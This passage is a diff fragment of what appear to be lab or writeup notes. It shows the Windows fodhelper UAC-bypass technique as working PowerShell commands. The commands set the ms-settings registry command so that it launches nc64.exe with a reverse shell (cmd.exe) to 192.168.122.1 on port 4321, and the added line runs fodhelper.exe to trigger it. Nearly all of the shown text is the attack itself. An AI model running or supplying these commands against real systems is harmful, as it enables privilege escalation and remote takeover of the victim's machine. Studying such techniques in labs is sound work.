@@ -383,6 +383,7 @@ Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
   | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type String
   | 
   | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e cmd.exe' -Type String
+  | fodhelper.exe
   `----
 ```
 
